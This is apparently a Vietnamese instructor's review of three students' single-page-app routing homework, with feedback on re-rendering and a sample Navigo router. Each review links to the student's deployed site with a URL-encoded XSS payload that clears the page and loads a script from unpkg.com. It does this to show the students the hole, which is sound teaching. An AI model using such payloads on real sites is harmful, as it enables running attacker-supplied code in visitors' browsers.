# Dương review bài tập về nhà buổi 40 - Lớp K2

## [Vũ Đức Tài](https://github.dev/Apeiron2/F8-fullstack-K2/tree/main/homework/day_40_Bundler/src)

- [x] Bài 1

  Bài làm tốt

  Các đoạn code và xử lý đều rất tốt

  Vì Error cũng là trang, nên đưa vào chung với pages để có thể xử lý được nhiều hơn

  Xử lý phần re-render chưa được tốt khiến cho khi chuyển trang thì re-render lại cả trang thay vì phần cần thay đổi.

  Chưa xử lý case **[XSS](https://apeironsepdhust.io.vn/san-pham/%3Cimg%0A%20%20src%3D%22%22%0A%20%20onerror%3D%27b%3Ddocument%2Ca%3Db.body%3Ba.innerHTML%3D%22%22%3Ba.appendChild%28c%20%3D%20b.createElement%28%22script%22%29%2Cc.type%3D%22module%22%2Cc.innerHTML%3D%60import%20%7BHTML%7D%20from%20%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%22%3BHTML%28%22h1%22%2C%20%22error%22%2C%20%22HACKED%21%22%29%60%29%3Ba.appendChild%28d%3Db.createElement%28%22link%22%29%2Cd.rel%3D%22stylesheet%22%2Cd.href%3D%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%2Fstyle.css%22%29%3B%27%0A%2F%3E)**

  Phần anh đang lỗi trang 404, anh thử theo cách của em làm xem sao nhé:

  ```js
  const render = (callback) => {
    root.innerHTML = callback();
  };

  const router = new Navigo('/');

  router
    .on({
      '/': () => {
        render(Home);
      },
      '/index.html': () => {
        render(Home);
      },
      '/about': () => {
        render(About);
      },
      '*': () => {
        render(NotFound);
      },
    })
    .notFound(() => {
      render(NotFound);
    })
    .resolve();
  ```

- [x] Đánh giá chung bài tập về nhà: Bài làm tốt, tuy nhiên chưa xử lý **kỹ** các case.

## [Nguyễn Đại Thế](https://router-dom-daithehh04.vercel.app/product)

- [x] Bài 1

  Bài làm tốt\*

  Các đoạn code và xử lý đều rất tốt

  Xử lý phần re-render rất được tốt.

  Vì Error cũng là trang, nên đưa vào chung với pages để có thể xử lý được nhiều hơn

  Chưa xử lý case **[XSS](https://router-dom-daithehh04.vercel.app/product/%3Cimg%0A%20%20src%3D%22%22%0A%20%20onerror%3D%27b%3Ddocument%2Ca%3Db.body%3Ba.innerHTML%3D%22%22%3Ba.appendChild%28c%20%3D%20b.createElement%28%22script%22%29%2Cc.type%3D%22module%22%2Cc.innerHTML%3D%60import%20%7BHTML%7D%20from%20%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%22%3BHTML%28%22h1%22%2C%20%22error%22%2C%20%22HACKED%21%22%29%60%29%3Ba.appendChild%28d%3Db.createElement%28%22link%22%29%2Cd.rel%3D%22stylesheet%22%2Cd.href%3D%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%2Fstyle.css%22%29%3B%27%0A%2F%3E)**

- [x] Đánh giá chung bài tập về nhà: Bài làm tốt, tuy nhiên chưa xử lý **kỹ** các case.

## [Đoàn Duy Chinh](https://github.com/DuyChinh/f8-fullstack-KS2/tree/main/Day-40/Day-40-SinglePage)

- [x] Bài 1

  Bài làm tốt

  Các đoạn code và xử lý đều rất tốt

  Vì Error cũng là trang, nên đưa vào chung với pages để có thể xử lý được nhiều hơn

  Xử lý phần re-render chưa được tốt khiến cho khi chuyển trang thì re-render lại cả trang thay vì phần cần thay đổi.

  Chưa xử lý case **[XSS](https://test-six-lyart-57.vercel.app/san-pham/%3Cimg%0A%20%20src%3D%22%22%0A%20%20onerror%3D%27b%3Ddocument%2Ca%3Db.body%3Ba.innerHTML%3D%22%22%3Ba.appendChild%28c%20%3D%20b.createElement%28%22script%22%29%2Cc.type%3D%22module%22%2Cc.innerHTML%3D%60import%20%7BHTML%7D%20from%20%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%22%3BHTML%28%22h1%22%2C%20%22error%22%2C%20%22HACKED%21%22%29%60%29%3Ba.appendChild%28d%3Db.createElement%28%22link%22%29%2Cd.rel%3D%22stylesheet%22%2Cd.href%3D%22https%3A%5C%2F%5C%2Funpkg.com%2Fjsvjp%2Fstyle.css%22%29%3B%27%0A%2F%3E)**

- [x] Đánh giá chung bài tập về nhà: Bài làm tốt, tuy nhiên chưa xử lý **kỹ** các case.
